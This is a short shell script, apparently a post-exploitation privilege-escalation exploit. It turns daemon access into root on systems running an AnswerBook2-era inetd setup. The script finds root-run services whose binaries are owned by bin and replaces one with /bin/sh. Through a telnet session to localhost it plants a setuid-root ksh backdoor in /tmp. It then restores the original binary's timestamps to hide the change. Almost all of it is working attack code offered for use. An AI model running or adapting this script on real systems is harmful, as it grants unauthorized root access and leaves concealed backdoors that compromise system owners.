#!/bin/sh
#answerbook2 post-exploitation exploit. upgrades from uid = daemon to euid = root 
#beta. needs better scripting
#sinan.eren@immunityinc.com

isbinowner()
{
	if [ "$ISBIN" = "bin" ]; then
		each=`echo $foo`
		echo $each
		GROUP=`ls -alL $each 2>/dev/null | awk {'print $4'}`
		exploit
		exit
	else
		test
	fi
}

exploit()
{
	
	#take backup of original binary
	BACKUP=`date +%M%S`"canvas.bin"
	cp $each /tmp/$BACKUP
	touch -r $each /tmp/$BACKUP
	chown bin /tmp/$BACKUP
	chgrp $GROUP /tmp/$BACKUP
	
	#now exploit
	SERVICE=`grep $each /etc/inetd.conf | head -1 | awk {'print $1'}`
	echo "exploiting user daemon owned service $SERVICE"
	OWNER=`date +%M%S`"madam"
	CMDFILE=`date +%M%S`"cmdz"
	echo "using backdoor binary $OWNER"
	cp /bin/ksh /tmp/$OWNER
	#securing so only group/user bin can get root out of it
	echo "securing backdoor so only user/group bin can run it"
	chmod 750 /tmp/$OWNER
	chgrp daemon /tmp/$OWNER
	
	echo "exploiting!"
	cp -f /bin/sh $each
	CMDZ="chown root /tmp/$OWNER; chmod 4755 /tmp/$OWNER; exit;"
	echo $CMDZ > $CMDFILE
	telnet 127.0.0.1 $SERVICE < $CMDFILE
	echo "restoring binary"
	/tmp/$OWNER -c "chown bin /tmp/$BACKUP"
	/tmp/$OWNER -c "chgrp $GROUP /tmp/$BACKUP"
	/tmp/$OWNER -c "cp -f $BACKUP $each"
	/tmp/$OWNER -c "chown bin $each"
	/tmp/$OWNER -c "chgrp $GROUP $each"
	/tmp/$OWNER -c "touch -r $BACKUP $each"
	echo "cleanin up"	
	/tmp/$OWNER -c "rm -f $CMDFILE $BACKUP"
	#echo "trying to get root"
	echo "you can run with root priviledges by using the /tmp/$OWNER -c \"command\" syntax"
	echo "DO NOT FORGET TO rm -f OR unlink THE SUID SHELL after usage: /tmp/$OWNER"
	#/tmp/$OWNER -i

}

PATH=/usr/bin:/usr/sbin:/sbin:$PATH
export PATH
INETD=`cat /etc/inetd.conf | grep -v "#" | grep tcp| grep root | awk {'print $6'} | grep -v internal`
for each in $INETD:
	do foo=`echo $each | sed s/://`; echo $foo; ISBIN=`ls -alL $foo 2>/dev/null | awk {'print $3'}`; echo $ISBIN; isbinowner;
done
